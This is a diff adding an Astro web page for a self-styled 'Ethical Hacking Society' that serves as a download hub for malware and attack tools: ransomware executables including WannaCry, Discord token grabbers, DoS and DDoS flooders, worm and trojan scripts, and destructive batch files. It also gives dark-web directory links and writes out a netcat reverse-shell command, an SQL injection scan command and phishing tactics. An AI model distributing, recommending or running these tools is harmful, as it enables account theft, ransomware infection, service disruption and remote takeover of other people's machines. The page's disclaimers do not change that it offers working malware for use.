@@ -1,0 +1,118 @@
+---
+import Head from '../layouts/Head.astro';
+import Scripts from '../layouts/Scripts.astro';
+import Hero   from '../components/Hero.astro';
+import Navbar from '../components/Navbar.astro';
+import Footer from '../components/Footer.astro';
+import Modal  from '../components/Modal.astro';
+import BackToTop from '../components/BackToTop.astro';
+---
+
+<Head title="Ethical Hacking Society" heroid="ehs" description="The Ethical Hacking Society is about ethical hacking as a whole." keyword="scripts, viruses, coding," author="CobraCommander" />
+<Navbar />
+        <Hero id="ehs" title="Ethical Hacking Society" description="The Ethical Hacking Society is about ethical hacking as a whole." primaryHref="https://discord.gg/yCnteHexEs" primaryText="Discord Server Invite" secondaryHref="/backup/ehs" secondaryText="View the all laid out format"
+icons={[
+    { icon: "discord", desc: "Discord Server Invite", href: "https://discord.gg/pgGfhDVrmS" },
+    { icon: "discord", desc: "Anti Vegans", href: "https://discord.gg/yCnteHexEs" },
+  ]}
+/>
+     <main id="ehs" class="mt-3 text-center container">
+       <div id="disclaimer">
+         <h2> Disclaimer </h2><p> We do not take responsibility for any damage, or legal issues, done with these files here at AT Products LLC, Ethical Hacking Society, The Script Community, CodingHome, or Noodle Hackerspace.      <br><br>
+    Use a virtual machine if it's a computer virus; never open it on your physical machine. As a precaution, download them on your VM.<br><br>If it's an APK file, use an emulator.<br><br><a href="https://www.vmware.com/topics/glossary/content/virtual-machine" target="_blank" rel="noopener noreferrer">More information on Virtual Machines (VM) </a><br><a href="https://developer.android.com/studio/run/emulator" target="_blank" rel="noopener noreferrer">More information on APK Emulators</a></p></div><hr>
+ <div id="resources" class="text-center">
+               <h2> Resources </h4>
+        <p> What do you want to know about today? </p>
+        <Modal title="Dark Web" id="dark-web"><Fragment slot="modal-content">
+      <h4> Disclaimer </h4>
+      <p> Even though The Dark Web is all legal, please be careful so you don't do <b>illegal activity</b>. We are not taking any responsibility for legal issues or damage done, even at AT Products, Ethical Hacking Society, CodingHome, or The Script Community. </p>
+      <p> Visit these links at your own risk, scammers and weirdos are common! <br> <br>
+        Use the <a href="https://onionbrowser.com/">Onion Browser</a>, or the <a href="https://www.torproject.org/download/">Tor Browser</a> to browse the dark web. </p>
+<p> The links in <b> bold </b> may not work correctly, so the ones that aren't in bold have been tested out and worked 100% correctly. Note that the Dark Web Pug's Guide has more links either for drugs, Bitcoin mixers, and even CIA sites!</p>
+     <h3> Forums </h3>
+     <p>  
+      <a href="http://qrtitjevs5nxq6jvrnrjyz5dasi3nbzx24mzmfxnuk2dnzhpphcmgoyd.onion/">Dark Web Pug's Guide</a> 
+     <a href="http://jaz45aabn5vkemy4jkg4mi4syheisqn2wn2n4fsuitpccdackjwxplad.onion/">OnionLinks v3</a> 
+     <a href="http://xsglq2kdl72b2wmtn5b2b7lodjmemnmcct37owlz5inrhzvyfdnryqid.onion/">The Hidden Wiki</a> 
+     <a href="http://bj5hp4onm4tvpdb5rzf4zsbwoons67jnastvuxefe4s3v7kupjhgh6qd.onion/">Another Hidden Wiki </a> 
+     <a href="http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/wiki/index.php/Main_Page">Wiki 3</a> </p>
+ </Fragment></Modal>       
+<Modal title="Slammer" id="slammer"><Fragment slot="modal-content">
+        <p><b>From <a href="/script">The Script Community</a>:</b> Slammer points to its own code as the data to send. The infected computer writes out a new copy of the worm and licks the UDP stamp. After sending off the first tainted packet, Slammer loops around immediately to send another to a different computer. </p>
+    <p> <a href="/media/files/Slammer_.py" download>Slammer (Python)</a> 
+        <a href="/media/files/Slammer_socks.py" download>Slammer Socks (Python)</a> 
+        <a href="/media/files/Slammer_terminal.py" download>Slammer Terminal (Python)</a> by CobraCommander. </p>
+</Fragment></Modal>
+        <Modal title="Denial for Service" id="dos"><Fragment slot="modal-content">
+   <p><b>From <a href="/script">The Script Community</a>:</b> A denial-of-service (DoS) attack is a type of cyber attack in which a malicious actor aims to render a computer or other device unavailable to its intended users by interrupting the device's normal functioning. DoS attacks typically function by overwhelming or flooding a targeted machine with requests until normal traffic is unable to be processed, resulting in denial-of-service to addition users. A DoS attack is characterized by using a single computer to launch the attack.
+    </p> <p> <a href="/media/files/http.py" download>HTTP Flooder (Python)</a> by Nasus</p>
+    <p> <a href="/media/files/requirements.txt" download>Requirements (TXT)</a> 
+        <a href="/media/files/MHViP.py" download>MHViP (Python)</a> 
+        <a href="/media/files/README.md" download>README (MD)</a>. These files are a private paid DDPS</p>
+</Fragment></Modal>
+<Modal title="Distributed Denial of Service" id="dos"><Fragment slot="modal-content">
+<p>  A distributed denial-of-service (DDoS) attack is a type of DoS attack that comes from many distributed sources, such as a botnet DDoS attack.  </p> 
+  <p> <a href="/media/files/SaphyraDDOS.py" download>SaphryaDDOS (Python)</a> <a href="/media/files/Ping_of_death_.py" download>Ping of Death (Python)</a> <a href="/media/files/UDP_Flood.py" download>UDP Flood (Python)</a> by CobraCommander</p>
+</Fragment></Modal>
+<Modal title="Token Grabbers" id="token"><Fragment slot="modal-content">
+        <p><b>From <a href="/script">The Script Community</a>:</b> A Token Grabber are supposed to grab people on Discord's tokens, to hack their account. </p>
+    <p> <a href="/media/files/token-grabber.py" download>Token Grabber (Python)</a> by Alex Toucan</p>
+    <p> <a href="/media/files/token.py" download="">Token Grabber (Python)</a> by wodxgod</p>
+    <p> <a href="/media/files/tokengrab.py" download>Token Grabber (Python)</a> by Wever </p>
+
+    <p> <a href="/media/files/token.7z" download>Token Grabber (7Z)</a> <a href="/media/files/Token_grabber4.py" download>Token Grabber (Python)</a> by CobraCommander</p>
+    <p> <a href="/media/files/tokencyb.js" download>Token Grabber (JavaScript)</a> by CУБΞЯC </p>
+    <p> <a href="/media/files/brutetoken.py" download>Token Bruteforcer (Python)</a> by Social404</p>
+
+    <h4> Wever Recommends these Steps </h4>
+    <a href="https://github.com/ii7x/IMAGE-DISCORD-TOKEN-GRABBER-BY-II7X">Token Grabber.js</a>
+      <a href="https://github.com/Nimplex/ss-grabber.js">ss-grabber.js</a>
+</Fragment></Modal>        
+<Modal title="Ransomware" id="ransom"><Fragment slot="modal-content">
+    <p> <a href="/media/files/DCQPKX.exe" download>DCQPKX (EXE)</a>
+     <a href="/media/files/Wannacry.exe" download>WannaCry (EXE)</a>
+       <a href="/media/files/Wannacry2.exe" download>WannaCry 2 (EXE)</a>
+     <a href="/media/files/MYDOOM.idb" download>MyDOOM (IDB)</a> 
+     <a href="/media/files/grandcab.bin" download>GrandCab (BIN)</a> 
+      <a href="/media/files/unknown" download>Unknown</a> 
+      <a href="/media/files/windows8-rt.msu" download>Windows 8 RT Virus (MSU)</a> 
+      <a href="/media/files/mydoom.c" download>MYDOOM (C)</a> <a href="media/files/RnVjayB5b3UgCg.bat" id="new">Infect Files (BAT)</a>
+       <a href="/media/files/Ransomware.exe" download>Homemade (EXE)</a> by CobraCommander </p>
+    <p> <a href="https://github.com/Endermanch/MalwareDatabase">Collection</a> by Endermanch </p> 
+</Fragment></Modal>
+<Modal title="Trojans" id="trojans"><Fragment slot="modal-content">        
+ <p><b>From <a href="/script">The Script Community</a>:</b> A Trojan horse in cybersecurity is any malware that misleads users of its true intent. It may look legitimate but can take control of your computer. A Trojan is designed to damage, disrupt, steal, or in general inflict some other harmful action on your data or network. </p>
+      <p> <a href="/media/files/memz-trojan.zip" download>MEMZ Trojan (ZIP | Python)</a>
+        <a href="/media/files/trojan-antivirus.bat" download>Trojan 1 (BAT)</a>
+        <a href="/media/files/trojan.bat" download>Trojan 2 (BAT)</a> 
+        <a href="/media/files/Trojan_.bat" download>Trojan 3 (BAT)</a>
+         <a href="/media/files/Trojan_3.bat" download>Trojan 4 (BAT)</a>
+         <a href="/media/files/Trojan_2.bat" download>Trojan 5 (BAT)</a>
+         by CobraCommander</p>
+</Fragment></Modal>        
+<Modal title="Worms" id="worms"><Fragment slot="modal-content">
+      <p> A worm virus refers to a malicious program that replicates itself, automatically spreading through a network. </p>
+      <p> <a href="/media/files/Networm.txt" download>Networm (TXT)</a> by CobraCommander </p>
+</Fragment></Modal>       
+ <Modal title="Other" id="other"><Fragment slot="modal-content">
+      <p><a href="/media/files/Doom.exe" download>Doom (EXE)</a> <a href="Techno.bat">Techno (BAT)</a> <a href="/media/files/viruscodes.txt" download>VirusCodes (TXT)</a> 
+        <a href="/media/files/DoomB.bat" download>Doom (BAT | Version 2)</a> 
+        <a href="/media/files//unknown.bat" download>Unknown (BAT)</a> 
+        <a href="/media/files/death.bat" download>Death (BAT)</a> 
+        <a href="/media/files/crash.bat" download>Crash (BAT)</a> 
+        <a href="/media/files/unknown1.bat" download>Unknown (BAT)</a> 
+        <a href="/media/files/Matrix.txt" download>Matrix (TXT)</a> 
+        <a href="/media/files/Script.bat" download>Script (BAT)</a> 
+        <a href="/media/files/pingerandddos.zip" download>Pinger and DDOS (RAR)</a> 
+        <a href="/media/files/Mydoom_3" download>MyDOOM_3</a> by CobraCommander</p>  
+   <p> <b>Reverse Shell Command on <a href="http://netcat.sourceforge.net/">Netcat</a></b> - 
+      <code>nc -e /bin/sh 10.0.0.1 1234</code>
+   <p> <b><a href="https://nmap.org/">Nmap</a> on Kali Linux SQL Injection</b> - <code>nmap --script=http-sql-injection &#60;target&#62;</code>
+   <p> <b>Ping of Death in “C”</b> - <code>ping &lt;IP Address&gt; -t |65500</code></p>
+   <p> <b> Social Engineering</b> - &quot;Spearhead phishing is effective but try something like whaling or watering hole&quot;</p>
+</Fragment></Modal>
+        </div> </main>
+<Footer author="CobraCommander & Alex Toucan"/>  
+<BackToTop />
+      </div>
+      <Scripts />
